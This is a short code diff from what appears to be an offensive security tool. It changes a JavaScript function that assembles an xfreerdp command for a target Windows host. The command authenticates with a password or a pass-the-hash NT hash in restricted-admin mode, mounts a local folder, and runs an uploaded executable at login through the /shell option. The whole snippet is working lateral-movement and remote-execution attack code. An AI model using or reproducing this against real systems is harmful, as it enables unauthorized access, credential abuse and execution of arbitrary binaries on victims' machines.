@@ -15575,11 +15575,12 @@ async function ipcRun(action) {
     const rdpCreds = (method === 'rdp-drive-pth' && ntHash)
       ? `/pth:${ntHash} /restricted-admin`
       : `/p:'${a.pass}'`;
-    // Double-escaped backslashes: shell double-quote reduces \\\\→\\ and \\→\, giving \\tsclient\upload\file.exe
+    // /shell: sets alternate shell at RDP login (no RemoteApp needed).
+    // Bash double-quote processing: \\\\→\\ and \\→\ giving \\tsclient\upload\file.exe to xfreerdp.
     cmds.push(
       `xfreerdp /v:${a.target} /u:'${a.user}' ${rdpCreds} /cert:ignore` +
       ` /drive:upload,${lbinDir}` +
-      ` /app:cmd.exe "/app-cmd:/c \\\\\\\\tsclient\\\\upload\\\\${lbinBase}"` +
+      ` /shell:"cmd.exe /c \\\\\\\\tsclient\\\\upload\\\\${lbinBase}"` +
       ` /f /log-level:OFF`
     );
   }
